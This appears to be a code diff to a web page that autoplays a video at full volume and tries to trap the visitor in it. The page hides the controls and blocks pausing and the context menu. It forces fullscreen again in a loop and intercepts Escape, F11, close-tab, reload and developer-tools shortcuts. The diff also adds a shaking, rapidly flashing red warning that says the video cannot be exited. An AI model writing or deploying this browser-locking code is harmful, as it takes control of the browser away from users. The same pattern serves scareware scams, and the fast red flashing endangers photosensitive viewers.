@@ -64,6 +64,7 @@ video::-webkit-media-controls-enclosure { display: none !important; }
   z-index: 9999;
   pointer-events: auto;
   background: rgba(0,0,0,0);
+  cursor: default;
 }
 
 /* Tooltip warning */
@@ -83,9 +84,22 @@ video::-webkit-media-controls-enclosure { display: none !important; }
   transition: opacity 0.3s ease;
   z-index: 10000;
 }
-#fullscreenTooltip.show {
-  opacity: 1;
+#fullscreenTooltip.show { opacity: 1; }
+
+/* Shake animations */
+@keyframes shake-small {0% {transform:translateX(-50%) translateX(0);}20% {transform:translateX(-50%) translateX(-4px);}40% {transform:translateX(-50%) translateX(4px);}60% {transform:translateX(-50%) translateX(-2px);}80% {transform:translateX(-50%) translateX(2px);}100% {transform:translateX(-50%) translateX(0);}}
+@keyframes shake-medium {0% {transform:translateX(-50%) translateX(0);}20% {transform:translateX(-50%) translateX(-8px);}40% {transform:translateX(-50%) translateX(8px);}60% {transform:translateX(-50%) translateX(-6px);}80% {transform:translateX(-50%) translateX(6px);}100% {transform:translateX(-50%) translateX(0);}}
+@keyframes shake-large {0% {transform:translateX(-50%) translateX(0);}20% {transform:translateX(-50%) translateX(-12px);}40% {transform:translateX(-50%) translateX(12px);}60% {transform:translateX(-50%) translateX(-10px);}80% {transform:translateX(-50%) translateX(10px);}100% {transform:translateX(-50%) translateX(0);}}
+#fullscreenTooltip.shake-small { animation: shake-small 0.4s; }
+#fullscreenTooltip.shake-medium { animation: shake-medium 0.35s; }
+#fullscreenTooltip.shake-large { animation: shake-large 0.3s; }
+
+/* Flashing red effect */
+@keyframes flash-red {
+  0%,50%,100% { background: rgba(255, 69, 0, 0.85); }
+  25%,75% { background: rgba(255, 0, 0, 0.95); }
 }
+#fullscreenTooltip.flash { animation: flash-red 0.15s infinite alternate; }
 </style>
 </head>
 <body>
@@ -102,7 +116,7 @@ video::-webkit-media-controls-enclosure { display: none !important; }
 </video>
 
 <div id="fullscreenOverlay"></div>
-<div id="fullscreenTooltip">⚠️ You cannot exit fullscreen. The video must remain in fullscreen.</div>
+<div id="fullscreenTooltip">⚠️ Fullscreen is mandatory. You cannot exit this video.</div>
 
 <script>
 const PROMPT_AFTER_MS = 5000;
@@ -117,124 +131,88 @@ let started = false;
 let isInFullscreen = false;
 let userInitiatedFullscreen = false;
 let preventPause = true;
+let spamCount = 0;
+let spamTimeout;
 
 // =========================
-// Anti-pause functions
+// Anti-pause
 // =========================
-function preventVideoPause(e) {
-  if (!started || !preventPause) return;
-  if (e.code === 'Space' || e.key === ' ' || e.keyCode === 32) { e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false; }
-  if (e.key === 'k' || e.key === 'K') { e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false; }
+function preventVideoPause(e){
+  if(!started||!preventPause) return;
+  if(e.code==='Space'||e.key===' '||e.keyCode===32){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;}
+  if(e.key==='k'||e.key==='K'){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;}
 }
-function preventContextMenu(e) {
-  if (started && preventPause) { e.preventDefault(); e.stopPropagation(); return false; }
-}
-function ensureVideoPlaying() {
-  if (!started || !preventPause) return;
-  if (vid.paused && !vid.ended) {
-    vid.play().catch(() => { setTimeout(() => { if (vid.paused && !vid.ended) vid.play().catch(() => {}); }, 50); });
-  }
-}
-function setupPlaybackMonitor() {
-  vid.addEventListener('pause', function(e) {
-    if (preventPause) { setTimeout(() => { if (vid.paused && !vid.ended) vid.play().catch(() => {}); }, 5); }
-  });
-  setInterval(ensureVideoPlaying, 250);
-}
+function preventContextMenu(e){ if(started&&preventPause){ e.preventDefault(); e.stopPropagation(); return false; }}
+function ensureVideoPlaying(){ if(!started||!preventPause) return; if(vid.paused&&!vid.ended){ vid.play().catch(()=>{setTimeout(()=>{ if(vid.paused&&!vid.ended) vid.play().catch(()=>{}); },50); }); }}
+function setupPlaybackMonitor(){ vid.addEventListener('pause',()=>{ if(preventPause){ setTimeout(()=>{ if(vid.paused&&!vid.ended) vid.play().catch(()=>{}); },5); } }); setInterval(ensureVideoPlaying,250); }
 
 // =========================
-// Fullscreen functions
+// Fullscreen
 // =========================
-function updateFullscreenState() {
-  const wasFullscreen = isInFullscreen;
-  isInFullscreen = !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement);
-  if (started) document.body.style.cursor = 'none';
-  if (wasFullscreen && !isInFullscreen) userInitiatedFullscreen = false;
-}
-document.addEventListener('fullscreenchange', updateFullscreenState);
-document.addEventListener('webkitfullscreenchange', updateFullscreenState);
-document.addEventListener('mozfullscreenchange', updateFullscreenState);
-document.addEventListener('MSFullscreenChange', updateFullscreenState);
+function updateFullscreenState(){ const wasFullscreen=isInFullscreen; isInFullscreen=!!(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement); if(started)document.body.style.cursor='none'; if(wasFullscreen&&!isInFullscreen) userInitiatedFullscreen=false;}
+document.addEventListener('fullscreenchange',updateFullscreenState);
+document.addEventListener('webkitfullscreenchange',updateFullscreenState);
+document.addEventListener('mozfullscreenchange',updateFullscreenState);
+document.addEventListener('MSFullscreenChange',updateFullscreenState);
 
-function enterFullscreen() {
-  if (isInFullscreen) return;
-  userInitiatedFullscreen = true;
-  if (vid.requestFullscreen) vid.requestFullscreen().catch(()=>{userInitiatedFullscreen=false;});
-  else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen().catch(()=>{userInitiatedFullscreen=false;});
-  else if (vid.mozRequestFullScreen) vid.mozRequestFullScreen().catch(()=>{userInitiatedFullscreen=false;});
-  else if (vid.msRequestFullscreen) vid.msRequestFullscreen().catch(()=>{userInitiatedFullscreen=false;});
-}
-
-function attemptReEnterFullscreen() {
-  if (!started) return;
-  if (!isInFullscreen) enterFullscreen();
-}
+function enterFullscreen(){ if(isInFullscreen)return; userInitiatedFullscreen=true; if(vid.requestFullscreen) vid.requestFullscreen().catch(()=>{userInitiatedFullscreen=false;}); else if(vid.webkitRequestFullscreen) vid.webkitRequestFullscreen().catch(()=>{userInitiatedFullscreen=false;}); else if(vid.mozRequestFullScreen) vid.mozRequestFullScreen().catch(()=>{userInitiatedFullscreen=false;}); else if(vid.msRequestFullscreen) vid.msRequestFullscreen().catch(()=>{userInitiatedFullscreen=false;}); }
+function attemptReEnterFullscreen(){ if(!started)return; if(!isInFullscreen) enterFullscreen(); }
 
 // =========================
-// Fullscreen tooltip
+// Tooltip & Shake + Flash
 // =========================
-function showFullscreenTooltip() {
+function showFullscreenTooltip(){
   tooltip.classList.add('show');
-  setTimeout(() => { tooltip.classList.remove('show'); }, 2000);
+  tooltip.classList.remove('shake-small','shake-medium','shake-large','flash');
+  void tooltip.offsetWidth; // reflow
+
+  // Determine shake + flash
+  if(spamCount<3) tooltip.classList.add('shake-small');
+  else if(spamCount<6) tooltip.classList.add('shake-medium');
+  else tooltip.classList.add('shake-large','flash'); // high spam: shake + flash
+
+  clearTimeout(overlay.tooltipTimeout);
+  overlay.tooltipTimeout=setTimeout(()=>{
+    tooltip.classList.remove('show','shake-small','shake-medium','shake-large','flash');
+  },2000);
+
+  // Increment spam count
+  spamCount++;
+  clearTimeout(spamTimeout);
+  spamTimeout = setTimeout(()=>{ spamCount=Math.max(spamCount-1,0); },1500);
 }
 
 // =========================
-// Fullscreen enforcement (flicker-free)
+// Fullscreen enforcement loop
 // =========================
-function enforceFullscreenLoop() {
-  if (!started) return;
-  if (!isInFullscreen) {
-    showFullscreenTooltip();
-    enterFullscreen();
-  }
-  requestAnimationFrame(enforceFullscreenLoop);
-}
+function enforceFullscreenLoop(){ if(!started)return; if(!isInFullscreen){ showFullscreenTooltip(); enterFullscreen(); } requestAnimationFrame(enforceFullscreenLoop); }
 
 // =========================
 // Adaptive preload
 // =========================
-function getNetworkProfile() {
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (!c) return { mode: "aggressive", reason: "no-api" };
-  const saveData = !!c.saveData;
-  const type = (c.effectiveType || "").toLowerCase();
-  if (saveData) return { mode: "conservative", reason: "save-data", type };
-  if (type === "slow-2g" || type === "2g") return { mode: "conservative", reason: "very-slow", type };
-  return { mode: "aggressive", reason: "default-aggressive", type };
+function getNetworkProfile(){ const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(!c)return{mode:"aggressive",reason:"no-api"}; const saveData=!!c.saveData; const type=(c.effectiveType||"").toLowerCase(); if(saveData)return{mode:"conservative",reason:"save-data",type}; if(type==="slow-2g"||type==="2g")return{mode:"conservative",reason:"very-slow",type}; return{mode:"aggressive",reason:"default-aggressive",type}; }
+function applyPreloadPolicy(profile){ if(profile.mode==="conservative"){ vid.preload="metadata"; return {warmup:false};} vid.preload="auto"; return {warmup:true}; }
+function kickOffFetch(){ try{vid.load();}catch(_){}
 }
-function applyPreloadPolicy(profile) {
-  if (profile.mode === "conservative") { vid.preload = "metadata"; return { warmup: false }; }
-  vid.preload = "auto"; return { warmup: true };
+async function warmupMuted(){ try{ vid.muted=true; const p=vid.play(); if(p&&typeof p.then==="function"){ await p; vid.pause(); try{vid.currentTime=0;}catch(_){}}}catch(_){}
 }
-function kickOffFetch() { try { vid.load(); } catch(_) {} }
-async function warmupMuted() {
-  try { vid.muted = true; const p = vid.play(); if (p && typeof p.then === "function") { await p; vid.pause(); try { vid.currentTime = 0; } catch(_) {} } } catch(_) {}
-}
-const profile = getNetworkProfile();
-const { warmup } = applyPreloadPolicy(profile);
+const profile=getNetworkProfile();
+const {warmup}=applyPreloadPolicy(profile);
 kickOffFetch();
-if (warmup) warmupMuted();
-const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-if (conn && typeof conn.addEventListener === "function") {
-  conn.addEventListener("change", () => {
-    if (started) return;
-    const p2 = getNetworkProfile();
-    const w2 = applyPreloadPolicy(p2).warmup;
-    kickOffFetch();
-    if (w2) warmupMuted();
-  });
-}
+if(warmup) warmupMuted();
+const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+if(conn&&typeof conn.addEventListener==="function"){ conn.addEventListener("change",()=>{ if(started)return; const p2=getNetworkProfile(); const w2=applyPreloadPolicy(p2).warmup; kickOffFetch(); if(w2) warmupMuted();});}
 
-// Show fallback click prompt
-setTimeout(() => { if (!started) prompt.style.display = "block"; }, PROMPT_AFTER_MS);
+// Show fallback prompt
+setTimeout(()=>{ if(!started) prompt.style.display="block"; },PROMPT_AFTER_MS);
 
 // =========================
-// Start function
+// Start
 // =========================
-function start(e) {
-  if (started) return;
-  started = true;
-  if (e?.type === "keydown" && (e.code==="Space" || e.key===" ")) e.preventDefault();
+function start(e){
+  if(started)return;
+  started=true;
+  if(e?.type==="keydown"&&(e.code==="Space"||e.key===" ")) e.preventDefault();
 
   loadingUI.remove();
   vid.style.display="block";
@@ -242,41 +220,47 @@ function start(e) {
   document.body.style.cursor='none';
 
   setupPlaybackMonitor();
-  window.addEventListener('keydown', preventVideoPause, true);
-  window.addEventListener('keyup', preventVideoPause, true);
-  window.addEventListener('keypress', preventVideoPause, true);
-  vid.addEventListener('contextmenu', preventContextMenu, true);
-  document.addEventListener('contextmenu', preventContextMenu, true);
-  document.addEventListener('mousemove', () => document.body.style.cursor='none');
+  window.addEventListener('keydown', preventVideoPause,true);
+  window.addEventListener('keyup', preventVideoPause,true);
+  window.addEventListener('keypress', preventVideoPause,true);
+  vid.addEventListener('contextmenu', preventContextMenu,true);
+  document.addEventListener('contextmenu', preventContextMenu,true);
+  document.addEventListener('mousemove',()=>document.body.style.cursor='none');
   vid.removeAttribute('controls');
 
   vid.muted=false;
   vid.volume=1;
-  vid.play().then(() => { ensureVideoPlaying(); }).catch(()=>{});
+  vid.play().then(()=>{ ensureVideoPlaying(); }).catch(()=>{});
 
   enterFullscreen();
-  window.addEventListener("keydown", attemptReEnterFullscreen, true);
-  window.addEventListener("pointerdown", attemptReEnterFullscreen, true);
-  window.addEventListener("click", attemptReEnterFullscreen, true);
+  window.addEventListener("keydown", attemptReEnterFullscreen,true);
+  window.addEventListener("pointerdown", attemptReEnterFullscreen,true);
+  window.addEventListener("click", attemptReEnterFullscreen,true);
 
   enforceFullscreenLoop();
 }
 
 // =========================
-// Overlay handlers
+// Overlay & tooltip handlers
 // =========================
-overlay.addEventListener("click", (e) => { e.preventDefault(); e.stopPropagation(); if(!isInFullscreen) { showFullscreenTooltip(); enterFullscreen(); } });
-overlay.addEventListener("contextmenu", (e) => { e.preventDefault(); e.stopPropagation(); });
+overlay.addEventListener("click",(e)=>{ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); });
+overlay.addEventListener("contextmenu",(e)=>{ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); });
+overlay.addEventListener("pointerdown",(e)=>{ e.preventDefault(); e.stopPropagation(); });
+overlay.addEventListener("pointerup",(e)=>{ e.preventDefault(); e.stopPropagation(); });
+overlay.addEventListener("dblclick",(e)=>{ e.preventDefault(); e.stopPropagation(); });
+overlay.addEventListener('mousemove',()=>{ showFullscreenTooltip(); });
 
-// Prevent ESC key
-window.addEventListener('keydown', function(e){
-  if (started && e.key === 'Escape') { e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); }
-}, true);
+// Block ESC, F11, Ctrl/Cmd
+window.addEventListener('keydown',function(e){
+  if(!started)return;
+  if(e.key==='Escape'||e.key==='F11'){ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); }
+  if((e.ctrlKey||e.metaKey)&&(e.key==='w'||e.key==='W'||e.key==='r'||e.key==='R'||(e.shiftKey&&(e.key==='I'||e.key==='i')))){ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); }
+},true);
 
 // Initial listeners
-window.addEventListener("keydown", start, true);
-window.addEventListener("pointerdown", start, true);
-clickContinue.addEventListener("click", start);
+window.addEventListener("keydown",start,true);
+window.addEventListener("pointerdown",start,true);
+clickContinue.addEventListener("click",start);
 
 updateFullscreenState();
 </script>
